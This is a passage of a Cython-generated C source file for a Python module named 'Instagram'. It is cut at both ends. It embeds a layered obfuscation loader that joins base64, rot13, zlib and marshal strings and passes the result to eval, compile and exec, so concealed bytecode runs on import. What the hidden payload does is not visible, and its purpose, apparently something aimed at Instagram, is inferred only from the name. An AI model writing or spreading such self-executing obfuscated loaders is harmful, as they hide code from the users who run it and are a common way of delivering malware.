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";
static PyObject *__pyx_n_s_CX21THHIcX3AzrQIeX2MaDzM4nRH0pSy;
static PyObject *__pyx_n_s_RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMG;
static PyObject *__pyx_n_s_Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBl;
static PyObject *__pyx_n_s_b64decode;
static PyObject *__pyx_n_s_base64;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_codecs;
static PyObject *__pyx_kp_s_codecs_decode_destiny_joy;
static PyObject *__pyx_kp_s_codecs_decode_love_joy;
static PyObject *__pyx_n_s_compile;
static PyObject *__pyx_n_s_destiny;
static PyObject *__pyx_n_s_eval;
static PyObject *__pyx_n_s_exec;
static PyObject *__pyx_n_s_god;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_joy;
static PyObject *__pyx_n_s_love;
static PyObject *__pyx_n_s_magic;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_rot13;
static PyObject *__pyx_kp_s_string;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_trust;
static PyObject *__pyx_kp_s_yywo3L4Eab1GTEuowWArQu4Y3tmo0AmE;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_Instagram(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_Instagram},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "Instagram",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_CX21THHIcX3AzrQIeX2MaDzM4nRH0pSy, __pyx_k_CX21THHIcX3AzrQIeX2MaDzM4nRH0pSy, sizeof(__pyx_k_CX21THHIcX3AzrQIeX2MaDzM4nRH0pSy), 0, 0, 1, 1},
  {&__pyx_n_s_RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMG, __pyx_k_RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMG, sizeof(__pyx_k_RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMG), 0, 0, 1, 1},
  {&__pyx_n_s_Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBl, __pyx_k_Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBl, sizeof(__pyx_k_Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBl), 0, 0, 1, 1},
  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},
  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_codecs, __pyx_k_codecs, sizeof(__pyx_k_codecs), 0, 0, 1, 1},
  {&__pyx_kp_s_codecs_decode_destiny_joy, __pyx_k_codecs_decode_destiny_joy, sizeof(__pyx_k_codecs_decode_destiny_joy), 0, 0, 1, 0},
  {&__pyx_kp_s_codecs_decode_love_joy, __pyx_k_codecs_decode_love_joy, sizeof(__pyx_k_codecs_decode_love_joy), 0, 0, 1, 0},
  {&__pyx_n_s_compile, __pyx_k_compile, sizeof(__pyx_k_compile), 0, 0, 1, 1},
  {&__pyx_n_s_destiny, __pyx_k_destiny, sizeof(__pyx_k_destiny), 0, 0, 1, 1},
  {&__pyx_n_s_eval, __pyx_k_eval, sizeof(__pyx_k_eval), 0, 0, 1, 1},
  {&__pyx_n_s_exec, __pyx_k_exec, sizeof(__pyx_k_exec), 0, 0, 1, 1},
  {&__pyx_n_s_god, __pyx_k_god, sizeof(__pyx_k_god), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_joy, __pyx_k_joy, sizeof(__pyx_k_joy), 0, 0, 1, 1},
  {&__pyx_n_s_love, __pyx_k_love, sizeof(__pyx_k_love), 0, 0, 1, 1},
  {&__pyx_n_s_magic, __pyx_k_magic, sizeof(__pyx_k_magic), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_rot13, __pyx_k_rot13, sizeof(__pyx_k_rot13), 0, 0, 1, 1},
  {&__pyx_kp_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 0},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_trust, __pyx_k_trust, sizeof(__pyx_k_trust), 0, 0, 1, 1},
  {&__pyx_kp_s_yywo3L4Eab1GTEuowWArQu4Y3tmo0AmE, __pyx_k_yywo3L4Eab1GTEuowWArQu4Y3tmo0AmE, sizeof(__pyx_k_yywo3L4Eab1GTEuowWArQu4Y3tmo0AmE), 0, 0, 1, 0},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_eval = __Pyx_GetBuiltinName(__pyx_n_s_eval); if (!__pyx_builtin_eval) __PYX_ERR(0, 8, __pyx_L1_error)
  __pyx_builtin_compile = __Pyx_GetBuiltinName(__pyx_n_s_compile); if (!__pyx_builtin_compile) __PYX_ERR(0, 9, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);
  __Pyx_RefNannyFinishContext();
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initInstagram(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initInstagram(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_Instagram(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_Instagram(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_Instagram(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'Instagram' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_Instagram(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("Instagram", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_Instagram) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "Instagram")) {
      if (unlikely(PyDict_SetItemString(modules, "Instagram", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "Instagram.py":2
 * # Kalo Mau Recode Izin Dulu bOs :v
 * import base64, codecs             # <<<<<<<<<<<<<<
 * magic = 'Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnpWZkd0d0hOZVZYbmZQZXpBWXZBRUNKTUVtU0VJRUJXQUdBNEFFU0lFVVNmQWxQa0NKbEdtTjVSMDM1amFBQnViRm5oNkM2QjE0WlZQT1BoeFoxRnJaVlZaaUZ2QzZVdEZXS3J1Vi9IRTUreU5KMVZaUytaR2tVdjZSbWtwVkVqdVZqV3AvMkZWWkp6YThsbkxPdWYyYTRZQVByNzJwWU5DM2I5OCs5OUgzM3Y3dWQrNDl0MzhnTlB6NTRYZ1pqdisxRnh3bU1ERW5wQVZWVklVdGlVbmI0Z05SaExCYlF1UmozeWNvZnFQODN4Y0Y0UWU3cFZMK0g2S2JDcDNGdEVobktTM1IyWmYyMGRtZjl0TTVrQTdRT1pnTzBqbVVEc0ZaeW9YemtYUkV4RFI4dVdpK0pkMUNmbjh1bG8rbFk2SVFFVmdnM2NxQzZUZ0xwZHRZT04zT0l1a09GazEzc3BaMEY0dWx1MW5yVnMreW9MWjlLTHduc3ZoN291VnJBMTgzK2RvZFg0Zmo2d1JmTy9tNm5MQnVKNnpIU2FYVHVkdnJoSFU3WVgzUEtMZm5HZVg2bjdGOEErK0oyMks2bCsxTjk3RjliUC9iUW5vUEcyUUg0TnpQWkhZUXpnTnNpQjJDODE1Mm1CMkI4ejQyekY2QTgzNTJsSTNBZVpBZFl5L0MrUUFiWldOd2xpOEpiSndsM2haWTRvR1VQc2lTYkFKQ2g3QkhqS1I0aHhnUmE1MjNWM1JWWVRlTHhkeUYrMnEyWWhSMUNHMDdYeXdVMUt5aEZRc1hkSjJDd3FXY1lpd1Y5YndaMnZ1RmlWT3pTZHN6WVh0U3RtZlM5a3pabm1uYmM5ejJuTWpYQlBPSW5NbGtQSWNzMjE0WnZGWkExQnl1d3NXYi9NaFVaZm5OaEN4WDRYWlY1ajhlUUhKeUJyeHlBdTdCalRjVDRQQi9Ma3NCS0plaG9NeWJrQmY2NlFLOGVKMndBNkk3NGhkMnhFTTc0aGNyWDRESyt2NWI3LytLL3FNMThaalpJWit0R0N0RlhUNHB2MVkwVjVTMXFMbEh2cWhrMWNWaWNRMENYOVlwZFB6K2hoazFCK1VyaGJLaExPdEszcjJWS1M0dGFWbE55VVVyNlY5cGVaVUJBSXJyUlZQTDVaVEU5SGhTUG5wTksxVHVuNUxQRnBoZTFKaDhmRHg1U3I3OCt0azdGNjdJbjd0eGEremE1SVI4cnFMbFdJSUhXbUduNVBWN0kvTFpVaW1uM2xFWHIycEdZbnJ5eFBqa2Nmbm8xY3UzcjE4YmxYUGFtaXBmVXJOcnhSSDVjNnBlaHQ2WW1JTDh6cS9veGJ5YU9BNTVqMDlPcHFiSEo1S3o4dlhpb3BaVDVWdktrcUpyZGtwdU5jRjFFbjZwaWZIWkUwNUJqNlltRTFUWXFaa2tLMm1uNUlua1RQTCt4TXhFeWk1LzQzUEE5UjMwWGo0bHIyakhVOU1RdDJSa2J0NCtKYy9PcEdabVVsT3BrYXdYWEVOd3RNSnhIZ0gyZzdBZ1BQU1pQektFTFpIQjZ5NEtobVQ0UGhRZWtJOUpXLzVsZ016M1JDTkFrT0FIWDVCOEFTY3M2SVNGbXNpRm04aEZtc2hGbThpMU5KR0xOWkZyclpNTDJSRHRrUXZaWU0ySElDTnNSRDRFK01mNHJKMzhRZkozR0ZGd094OUZINGliUWxWZ1hmZUVoNkwrWnc5RlU2cXJqWlltdGRIU1VLcnVKbkxoSm5JOVRlU2lUZVI2NitSQ1RtMjBORHhsMzNNOXBWZ1ZyYWNjZ3BaMzVmZDQ1UHNmaFNtOTJGWXJHNkErZ3IxbEwvbmlEd1JSS0dRaGxYMlV5b1huVEdXL0o1VjVTR1dRVWxsNXpsUU9lRkk1QXFuSWxNcGRvNDFDWkNOT2NmMVlRNUJha0ZKRC8wR2UyaDM0TWVIV1U4OSt3V2gvS0c3OGMxSFlsRVRCSE5nMTNjNnE5S0h3S01MVGZnUGlia3BmbG5nYTNMOHVybVAvd2pxVDlLbTZ2aFZ0NkF0RFRwamJGdzdWeVVYSWQ3aUozSkZuVEcvNEdlVmVhSkx2MFNaeUkwNGZwRGJoVHc3UGk2M3IwLzlrMTU1NXpOTXpmVVpIMWZkQVpDK3VTVkJIUzd2VzlhamRocGlIMGJuVnRRMXQvKzcwcHIvcU03b2ZDR3pzSTJrelVQV3Y5ckR4YW9BbDNwRzJlcmVGelNCTFZvTnNvbCtnRm5oLzE5UlRQUFdIWWlIQUpvMCtpRFBWRCtoSXNmN0pyckdtZWF6Q1g3TGpkWEY4K29QbnhwRVQ3NG1Rd2t5L3NMVm5XNkNRWmpHYkljc3N4VHpadjN1c1pqaHppbUpCaWJmNm41QmZyRW5NbHlqbXhGTml4cHZFbkhONlV5ZWxjZm9KWlQ3VEpQN0xEdnJ4K0dmZCtGWS9IR0RuMlBrSDB0YmVxbS9ieG85NTh1MGpqT2g5d3JzY1pCZnNaN0xmYVFaWTRCY2UrQ0JtYkFMYXRmenRkUWpIM3h0T2YzZDZ2VXd0L3ozQU5KNU